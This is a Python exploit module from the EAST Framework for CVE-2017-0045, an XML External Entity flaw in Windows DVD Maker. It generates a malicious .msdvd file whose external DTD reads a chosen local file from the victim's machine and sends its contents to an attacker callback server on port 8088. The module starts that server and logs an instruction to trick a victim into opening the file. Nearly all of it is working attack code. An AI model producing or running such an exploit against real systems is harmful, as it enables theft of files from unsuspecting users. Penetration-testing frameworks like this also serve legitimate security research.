#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import time
import urllib
import thread

sys.path.append('./core')
from Sploit import Sploit
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer

INFO = {}
INFO['NAME'] = "efa_microsoft_windows_dvd_maker_xxe"
INFO['DESCRIPTION'] = "Windows DVD Maker 6.1.7 - XML External Entity Injection"
INFO['VENDOR'] = "https://www.microsoft.com"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/41619/']
INFO["CVE Name"] = "CVE-2017-0045"
INFO["NOTES"] = """Windows DVD Maker Project ".msdvd" files are prone to XML External Entity attacks allowing remote attackers to gain access to files from a victims computer using a specially crafted malicious .msdvd file, resulting in remote information / file disclosures.

Tested Windows 7 SP1
"""

INFO['CHANGELOG'] = "16 Mar, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["CALLBACK_IP"] = "127.0.0.1", dict(description = 'Server IP')
OPTIONS["PATH"] = "C:/windows/win.ini", dict(description = 'File path')

DTD = '''<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://{}:8088?%file;'>">
%all;'''
LOG = None

class MyHandler(BaseHTTPRequestHandler):
        
    def do_GET(self):
        try:
            self.send_response(200)
            self.send_header('Server','EaST')
            if self.path.endswith('.dtd'):
                self.send_header('Content-Type', 'text/xml')
                self.send_header('Content-length', len(DTD))
                self.end_headers()
                
                self.wfile.write(DTD)
        except Exception as e:
            print e
            print 'Error'
            
    def log_message(self, format, *args):
        LOG(urllib.unquote(args[0]))

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.callback_ip = ''
        self.path = ''
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.callback_ip = self.args.get('CALLBACK_IP', OPTIONS["CALLBACK_IP"])
        self.path = self.args.get('PATH', OPTIONS["PATH"])
    
    def run(self):
        self.args()
        
        global DTD
        global LOG
        LOG = self.log
        DTD = DTD.format(self.callback_ip)
        
        self.log('Starting server')
        serv = HTTPServer(('', 8088), MyHandler)
        thread.start_new_thread(serv.serve_forever, ())
        
        dvd = '''<?xml version="1.0"?>
<!DOCTYPE NYHC [ 
<!ENTITY % file SYSTEM "{}">
<!ENTITY % dtd SYSTEM "http://{}:8088/payload.dtd">
%dtd;]>
<pwn>&send;</pwn>'''.format(self.path, self.callback_ip)
        
        out_path = './OUTPUTS/' + INFO['NAME'] + '/east.msdvd'
        if not os.path.exists(os.path.split(out_path)[0]):
            os.makedirs(os.path.split(out_path)[0])
        with open(out_path, 'w') as fd:
            fd.write(dvd)
            
        self.log("Take east.msdvd from OUTPUT directory and trick victim to open it")
        self.log('Wait 120 seconds for receive file')
        
        time.sleep(120)
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
